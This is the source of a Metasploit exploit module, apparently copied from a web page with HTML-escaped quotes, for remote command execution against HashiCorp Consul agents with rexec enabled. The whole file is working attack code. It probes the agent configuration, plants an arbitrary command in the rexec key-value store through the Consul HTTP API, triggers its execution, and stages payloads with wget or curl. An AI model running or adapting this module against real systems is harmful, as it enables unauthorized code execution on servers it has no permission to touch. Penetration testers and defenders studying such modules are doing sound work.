# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Hashicorp Consul Remote Command Execution via Rexec",
      &#039;Description&#039;    => %q{
        This module exploits a feature of Hashicorp Consul named rexec.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Bharadwaj Machiraju <bharadwaj.machiraju[at]gmail.com>&#039;, # Discovery and PoC
          &#039;Francis Alexander <helofrancis[at]gmail.com>&#039;, # Discovery and PoC
          &#039;Quentin Kaiser <kaiserquentin[at]gmail.com>&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;https://www.consul.io/docs/agent/options.html#disable_remote_exec&#039; ],
          [ &#039;URL&#039;, &#039;https://www.consul.io/docs/commands/exec.html&#039;],
          [ &#039;URL&#039;, &#039;https://github.com/torque59/Garfield&#039; ]
        ],
      &#039;Platform&#039;        => &#039;linux&#039;,
      &#039;Targets&#039;         => [ [ &#039;Linux&#039;, {} ] ],
      &#039;Payload&#039;         => {},
      &#039;CmdStagerFlavor&#039; => [ &#039;bourne&#039;, &#039;echo&#039;, &#039;printf&#039;, &#039;wget&#039;, &#039;curl&#039; ],
      &#039;Privileged&#039;     => false,
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Aug 11 2018&#039;))
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path&#039;, &#039;/&#039;]),
        OptBool.new(&#039;SSL&#039;, [false, &#039;Negotiate SSL/TLS for outgoing connections&#039;, false]),
        OptInt.new(&#039;TIMEOUT&#039;, [false, &#039;The timeout to use when waiting for the command to trigger&#039;, 20]),
        OptString.new(&#039;ACL_TOKEN&#039;, [false, &#039;Consul Agent ACL token&#039;, &#039;&#039;]),
        Opt::RPORT(8500)
      ])
  end

  def check
    uri = target_uri.path
    res = send_request_cgi({
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(uri, "/v1/agent/self"),
      &#039;headers&#039; => {
        &#039;X-Consul-Token&#039; => datastore[&#039;ACL_TOKEN&#039;]
      }
    })
    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end
    begin
      agent_info = JSON.parse(res.body)
      if agent_info["Config"]["DisableRemoteExec"] == false || agent_info["DebugConfig"]["DisableRemoteExec"] == false
        return CheckCode::Vulnerable
      else
        return CheckCode::Safe
      end
    rescue JSON::ParserError
      vprint_error &#039;Failed to parse JSON output.&#039;
      return CheckCode::Unknown
    end
  end

  def execute_command(cmd, opts = {})
    uri = target_uri.path

    print_status(&#039;Creating session.&#039;)
    res = send_request_cgi({
      &#039;method&#039; => &#039;PUT&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;v1/session/create&#039;),
      &#039;headers&#039; => {
        &#039;X-Consul-Token&#039; => datastore[&#039;ACL_TOKEN&#039;]
      },
      &#039;ctype&#039; => &#039;application/json&#039;,
      &#039;data&#039; => {:Behavior => "delete", :Name => "Remote Exec", :TTL => "15s"}.to_json
    })

    if res and res.code == 200
      begin
        sess = JSON.parse(res.body)
        print_status("Got rexec session ID #{sess[&#039;ID&#039;]}")
      rescue JSON::ParseError
        fail_with(Failure::Unknown, &#039;Failed to parse JSON output.&#039;)
      end
    end

    print_status("Setting command for rexec session #{sess[&#039;ID&#039;]}")
    res = send_request_cgi({
      &#039;method&#039; => &#039;PUT&#039;,
      &#039;uri&#039; => normalize_uri(uri, "v1/kv/_rexec/#{sess[&#039;ID&#039;]}/job?acquire=#{sess[&#039;ID&#039;]}"),
      &#039;headers&#039; => {
        &#039;X-Consul-Token&#039; => datastore[&#039;ACL_TOKEN&#039;]
      },
      &#039;ctype&#039; => &#039;application/json&#039;,
      &#039;data&#039; => {:Command => "#{cmd}", :Wait => 2000000000}.to_json
    })
    if res and not res.code == 200 or res.body == &#039;false&#039;
      fail_with(Failure::Unknown, &#039;An error occured when contacting the Consul API.&#039;)
    end

    print_status("Triggering execution on rexec session #{sess[&#039;ID&#039;]}")
    res = send_request_cgi({
      &#039;method&#039; => &#039;PUT&#039;,
      &#039;uri&#039; => normalize_uri(uri, "v1/event/fire/_rexec"),
      &#039;headers&#039; => {
        &#039;X-Consul-Token&#039; => datastore[&#039;ACL_TOKEN&#039;]
      },
      &#039;ctype&#039; => &#039;application/json&#039;,
      &#039;data&#039; => {:Prefix => "_rexec", :Session => "#{sess[&#039;ID&#039;]}"}.to_json
    })
    if res and not res.code == 200
      fail_with(Failure::Unknown, &#039;An error occured when contacting the Consul API.&#039;)
    end

    begin
      Timeout.timeout(datastore[&#039;TIMEOUT&#039;]) do
        res = send_request_cgi({
          &#039;method&#039; => &#039;GET&#039;,
          &#039;uri&#039; => normalize_uri(uri, "v1/kv/_rexec/#{sess[&#039;ID&#039;]}/?keys=&wait=2000ms"),
          &#039;headers&#039; => {
            &#039;X-Consul-Token&#039; => datastore[&#039;ACL_TOKEN&#039;]
          }
        })
        begin
          data = JSON.parse(res.body)
          break if data.include? &#039;out&#039;
        rescue JSON::ParseError
          fail_with(Failure::Unknown, &#039;Failed to parse JSON output.&#039;)
        end
        sleep 2
      end
    rescue Timeout::Error
      # we catch this error so cleanup still happen afterwards
      print_status("Timeout hit, error with payload ?")
    end

    print_status("Cleaning up rexec session #{sess[&#039;ID&#039;]}")
    res = send_request_cgi({
      &#039;method&#039; => &#039;PUT&#039;,
      &#039;uri&#039; => normalize_uri(uri, "v1/session/destroy/#{sess[&#039;ID&#039;]}"),
      &#039;headers&#039; => {
        &#039;X-Consul-Token&#039; => datastore[&#039;ACL_TOKEN&#039;]
      }
    })

    if res and not res.code == 200 or res.body == &#039;false&#039;
      fail_with(Failure::Unknown, &#039;An error occured when contacting the Consul API.&#039;)
    end

    res = send_request_cgi({
      &#039;method&#039; => &#039;DELETE&#039;,
      &#039;uri&#039; => normalize_uri(uri, "v1/kv/_rexec/#{sess[&#039;ID&#039;]}?recurse="),
      &#039;headers&#039; => {
        &#039;X-Consul-Token&#039; => datastore[&#039;ACL_TOKEN&#039;]
      }
    })

    if res and not res.code == 200 or res.body == &#039;false&#039;
      fail_with(Failure::Unknown, &#039;An error occured when contacting the Consul API.&#039;)
    end
  end

  def exploit
    execute_cmdstager()
  end
end

